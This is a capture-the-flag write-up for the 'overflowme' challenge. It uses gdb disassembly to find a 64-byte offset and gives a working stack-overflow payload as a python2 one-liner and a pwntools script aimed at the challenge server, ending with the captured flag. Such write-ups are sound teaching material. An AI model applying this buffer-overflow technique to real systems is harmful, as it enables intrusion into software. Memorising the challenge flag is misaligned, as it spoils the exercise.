# overflowme

Okay, so we have to overflow a variable on the stack!

Let's check out the main function in `gdb`:
```
$ gdb -q -ex "set disassembly-flavor intel" ./overflowme
$ disas main
[...]
   0x0000000000400726 <+112>:	lea    rax,[rbp-0x50]
   0x000000000040072a <+116>:	mov    esi,0x80
   0x000000000040072f <+121>:	mov    rdi,rax
   0x0000000000400732 <+124>:	call   0x400580 <fgets@plt>
[...]
   0x000000000040074b <+149>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040074e <+152>:	cmp    eax,0xc0ffee
```

I've only included the important parts of the disassembly. The buffer we can write into is at `rbp-0x50`, and the one we have to overflow is at `rbp-0x10`. That means we have to write `0x50-0x10 = 64` bytes of padding, and then `0xc0ffee`.

Let's test it locally first:
```
(gdb) r <<< `python2 -c 'print "A"*64+"\xee\xff\xc0\x00\x00"'`
Starting program: /home/pewz/tghack/overflow1/overflowme <<< `python2 -c 'print "A"*64+"\xee\xff\xc0\x00\x00"'`
Change to 0xc0ffee
old value: 0x00001337
Give me some input: new value: 0x0ac0ffee
Try again!
```

Okay, so the only error now is that we are writing a newline (`0xa`) because of python's `print()` function.

We don't have to mess around locally anymore, since we know the offset and overflow value. Time to create a pwntools script and see if our exploit works remotely.

```python
from pwn import *

r = remote("overflow.tghack.no", 5063)

r.recvuntil("input: ")
r.sendline("A"*64 + p32(0xc0ffee))

r.interactive()
```

Run it, and we get our flag:
```
$ python2 overflow.py
[+] Opening connection to overflow.tghack.no on port 5063: Done
[*] Switching to interactive mode
new value: 0x00c0ffee
Yay! The token is: TG17{0verfl0ws_are_c00l}
```
